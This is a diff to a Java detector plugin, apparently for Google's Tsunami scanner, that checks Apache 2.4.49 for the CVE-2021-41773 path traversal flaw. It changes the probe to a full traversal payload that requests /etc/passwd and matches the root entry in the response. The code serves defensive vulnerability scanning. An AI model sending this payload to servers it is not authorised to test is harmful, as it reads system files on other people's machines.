@@ -6,11 +6,11 @@ import static com.google.tsunami.common.net.http.HttpRequest.get;
 
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
-import com.google.inject.Inject;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
 import com.google.tsunami.common.net.http.HttpClient;
 import com.google.tsunami.common.net.http.HttpResponse;
+import com.google.tsunami.common.net.http.HttpStatus;
 import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
@@ -27,6 +27,8 @@ import java.io.IOException;
 import java.time.Clock;
 import java.time.Instant;
 import java.util.Optional;
+import java.util.regex.Pattern;
+import javax.inject.Inject;
 
 /**
  * A {@link VulnDetector} that detects the CVE-2021-41773 vulnerability.
@@ -46,6 +48,8 @@ public class ApacheHttpServerCVE202141773VulnDetector implements VulnDetector {
 
   private final Clock utcClock;
   private final HttpClient httpClient;
+
+  private final Pattern vulnerabilityResponsePattern = Pattern.compile("root:[x*]:0:0:");
 
   @Inject
   ApacheHttpServerCVE202141773VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
@@ -68,15 +72,23 @@ public class ApacheHttpServerCVE202141773VulnDetector implements VulnDetector {
 
   private boolean isServiceVulnerable(NetworkService networkService) {
     String targetUri =
-        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "cgi-bin/.%2e/";
+        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
+            + "cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd";
     try {
       HttpResponse response = httpClient.send(get(targetUri).withEmptyHeaders().build(),
           networkService);
       Optional<String> server = response.headers().get("Server");
       Optional<String> body = response.bodyString();
-      if (server.isPresent() && server.get().contains("Apache/2.4.49") && body.isPresent()
-          && !body.get().contains("You don't have permission to access this resource.")) {
-        return true;
+      if (server.isPresent() && server.get().contains("Apache/2.4.49")) {
+        // require all denied
+        if (response.status() == HttpStatus.FORBIDDEN && body.isPresent()
+            && body.get().contains("You don't have permission to access this resource.")) {
+          return false;
+        }
+        if (response.status() == HttpStatus.OK && body.isPresent()
+            && vulnerabilityResponsePattern.matcher(body.get()).find()) {
+          return true;
+        }
       }
     } catch (IOException e) {
       logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
